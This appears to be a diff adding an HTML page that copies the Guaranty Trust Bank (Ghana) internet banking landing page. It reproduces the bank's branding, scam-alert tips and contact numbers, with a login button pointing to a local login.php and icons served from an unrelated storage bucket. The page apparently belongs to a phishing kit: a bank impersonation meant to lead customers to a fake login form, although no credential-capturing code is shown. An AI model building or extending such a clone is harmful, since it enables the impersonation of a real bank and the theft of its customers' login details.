@@ -1,0 +1,234 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8"/>
+    <meta content="width=device-width, initial-scale=1.0" name="viewport"/>
+    <title>Internet Banking</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: white;
+        }
+        .container {
+            max-width: 1024px;
+            margin: 0 auto;
+        }
+        .header-logo {
+            text-align: right;
+            padding: 10px;
+        }
+        .header-logo img {
+            height: 50px;
+        }
+        .header-text {
+            font-size: 12px;
+            color: #666;
+            margin-top: 5px;
+        }
+        .internet-banking-header {
+            background-color: #bbbdc0;
+            color: #333;
+            padding: 15px 20px;
+            font-weight: bold;
+            font-size: 18px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        .ghana-flag {
+            height: 20px;
+            width: 30px;
+        }
+        .main-content {
+            display: flex;
+            margin-top: 20px;
+        }
+        .login-section {
+            flex: 1;
+            padding: 0 10px;
+        }
+        .login-button {
+            background-color: #3a9614;
+            color: white;
+            text-align: center;
+            padding: 20px;
+            cursor: pointer;
+            border: none;
+            width: 100%;
+            font-size: 20px;
+            font-weight: bold;
+            border-radius: 5px;
+        }
+        .power-icon {
+            background-color: #e95420;
+            width: 60px;
+            height: 60px;
+            border-radius: 50%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin: 15px auto 0;
+        }
+        .power-icon img {
+            width: 30px;
+            height: 30px;
+        }
+        .alerts-section {
+            flex: 2;
+            padding: 0 10px;
+        }
+        .scam-alert {
+            background-color: #bbbdc0;
+            padding: 15px;
+            border-radius: 5px;
+        }
+        .scam-alert-title {
+            font-weight: bold;
+            margin-bottom: 10px;
+        }
+        .alert-item {
+            display: flex;
+            align-items: flex-start;
+            margin-bottom: 15px;
+            background-color: white;
+            padding: 10px;
+            border-radius: 5px;
+        }
+        .alert-icon {
+            width: 50px;
+            margin-right: 10px;
+        }
+        .alert-text {
+            flex: 1;
+        }
+        .alert-number {
+            width: 30px;
+            height: 30px;
+            background-color: #4a4a4a;
+            color: white;
+            border-radius: 50%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-weight: bold;
+            margin-left: 10px;
+        }
+        .email-alert {
+            background-color: #f1f1f1;
+            padding: 15px;
+            margin-top: 15px;
+            border-radius: 5px;
+        }
+        .email-alert-title {
+            font-weight: bold;
+            color: #e95420;
+            margin-bottom: 10px;
+        }
+        .security-centre {
+            text-align: center;
+            margin: 15px 0;
+            color: #666;
+        }
+        .footer {
+            background: linear-gradient(to right, #e95420, #ff7f50);
+            color: white;
+            text-align: center;
+            padding: 10px;
+            margin-top: 15px;
+        }
+        .footer a {
+            color: white;
+            text-decoration: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header-logo">
+            <img src="images/logo.png" alt="GTBank Logo">
+            <div class="header-text">Guaranty Trust Bank (Ghana) Ltd</div>
+        </div>
+        
+        <div class="internet-banking-header">
+            INTERNET BANKING
+            <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAKCAYAAAC9vt6cAAAABGdBTUEAALGPC/xhBQAAACBjSFJNAAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAAACXBIWXMAAAsTAAALEwEAmpwYAAABWWlUWHRYTUw6Y29tLmFkb2JlLnhtcAAAAAAAPHg6eG1wbWV0YSB4bWxuczp4PSJhZG9iZTpuczptZXRhLyIgeDp4bXB0az0iWE1QIENvcmUgNS40LjAiPgogICA8cmRmOlJERiB4bWxuczpyZGY9Imh0dHA6Ly93d3cudzMub3JnLzE5OTkvMDIvMjItcmRmLXN5bnRheC1ucyMiPgogICAgICA8cmRmOkRlc2NyaXB0aW9uIHJkZjphYm91dD0iIgogICAgICAgICAgICB4bWxuczp0aWZmPSJodHRwOi8vbnMuYWRvYmUuY29tL3RpZmYvMS4wLyI+CiAgICAgICAgIDx0aWZmOk9yaWVudGF0aW9uPjE8L3RpZmY6T3JpZW50YXRpb24+CiAgICAgIDwvcmRmOkRlc2NyaXB0aW9uPgogICA8L3JkZjpSREY+CjwveDp4bXBtZXRhPgpMwidZAAAA7UlEQVQoFY2RPQuCQBiAz/JTMcPACiJoiYaWlpaWfoH9ghbb+wEtNbRFS/QTamt1aQiioSUoIoIkMT/q7nxLveKWHnjf973zuePUCwX+QJIksCyLz3MQi7HneWCMBWIkSQJVVREEQQDGPM8jwzDI933K5/M0Go3oz28ymj3P5/MQRRHTNEFg27a0Wi1wMk3TcF0XjUYD/X7/LYiiiGazGXieR6VSBd/3kM3lQjtYrVYhjuM1sNlsKJPRqd1u0+l0onK5QpvNlpILhmFQrVajbrfH6LruN0LnfD7P8DwPhbih0+lO945oKIoCQRBgmiYe+VVmvDz7LewAAAAASUVORK5CYII=" alt="Ghana Flag" class="ghana-flag">
+        </div>
+        
+        <div class="main-content">
+            <div class="login-section">
+                <div class="login-button">
+                    <a href="login.php" style="text-decoration: none; color: white;">
+                    Click here<br>to Login
+                </a>
+                    <div class="power-icon">
+                        <img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCIgZmlsbD0id2hpdGUiPjxwYXRoIGQ9Ik0xMyAzaC0ydjEwaDJWM3ptNC44MyA5LjEzYy0uNTMtLjYzLS44Mi0xLjQ0LS44Mi0yLjMxIDAtMS45MSAxLjQ3LTMuNDggMy4yOS0zLjY5QzE5LjI1IDMuOTMgMTcgMiAxNC4zMiAyQzExLjE0IDIgOC43MSA0LjMgOC4xNSA3LjM0QzUuNjcgNy4yNyAzLjU2IDkuMzIgMy41NiAxMS44OUMzLjU2IDE0LjU4IDUuNzMgMTcgOC41IDE3SDEwdjJoMTFWMTNIMTd2MmMtMi44MyAwLTUuMTktMS45Ny01LjY1LTQuNzEgNC44OS0uMS05LjE1LS4xLTMuNTItMS44NnoiLz48L3N2Zz4=" alt="Power Icon">
+                    </div>
+                </div>
+            </div>
+            
+            <div class="alerts-section">
+                <div class="scam-alert">
+                    <div class="scam-alert-title">SCAM ALERT</div>
+                    
+                    <div class="alert-item">
+                        <img src="https://storage.googleapis.com/a1aa/image/WigLbv_m7lYneUdMJaUpp2HZzCFMLUrcTDcVxrZHe_o.jpg" alt="Alert Icon" class="alert-icon">
+                        <div class="alert-text">
+                            Ensure no one is looking over your shoulders as you use your card. Make sure you observe your surroundings.
+                        </div>
+                        <div class="alert-number">1</div>
+                    </div>
+                    
+                    <div class="alert-item">
+                        <img src="https://storage.googleapis.com/a1aa/image/lspmi2PAGx7GDINGN0E4QQp-C8uB1NsNvUNgu4DThis.jpg" alt="Alert Icon" class="alert-icon">
+                        <div class="alert-text">
+                            Protect your PIN. Do not disclose it to anyone.
+                        </div>
+                        <div class="alert-number">2</div>
+                    </div>
+                    
+                    <div class="alert-item">
+                        <img src="https://storage.googleapis.com/a1aa/image/1H79LqdL07OLP_bBnQGUbRFNp0Elm7Hrk8dTOpRDoSk.jpg" alt="Alert Icon" class="alert-icon">
+                        <div class="alert-text">
+                            If you believe your PIN or Password has been compromised please visit any branch or call (+233 302) 611560, 677704.
+                        </div>
+                        <div class="alert-number">3</div>
+                    </div>
+                    
+                    <div class="alert-item">
+                        <img src="https://storage.googleapis.com/a1aa/image/AvzqyAzLQOz3ze5gmuucy85eopQiv_pr4ioxLOcUl-Y.jpg" alt="Alert Icon" class="alert-icon">
+                        <div class="alert-text">
+                            Your Account User ID and Password are confidential. Do not disclose them to anyone.
+                        </div>
+                        <div class="alert-number">4</div>
+                    </div>
+                    
+                    <div class="alert-item">
+                        <img src="https://storage.googleapis.com/a1aa/image/bN-whEEixXRH9Ajk0KFgmrujMyq5-KSc3icRqjMH9TQ.jpg" alt="Alert Icon" class="alert-icon">
+                        <div class="alert-text">
+                            Always log on to our internet banking service via our website - <span style="color: #0066cc;">www.gtbghana.com</span>
+                        </div>
+                        <div class="alert-number">5</div>
+                    </div>
+                </div>
+                
+                <div class="email-alert">
+                    <div class="email-alert-title">Scam E-mails Alert</div>
+                    <p>
+                        Our attention has been drawn to emails being sent out by fraudsters requesting for sensitive information such as Internet Banking and ATM Card details. Some of these emails also request that customers update their account records by clicking on links to fake internet banking websites. We advise all customers to ignore such emails as they do not originate from Guaranty Trust Bank (Ghana) Limited.
+                    </p>
+                </div>
+            </div>
+        </div>
+        
+        <div class="security-centre">
+            VISIT OUR SECURITY CENTRE
+        </div>
+        
+        <div class="footer">
+            GTBGHANA.COM | TERMS &amp; CONDITIONS | WHISTLE BLOWER
+        </div>
+    </div>
+</body>
+</html>
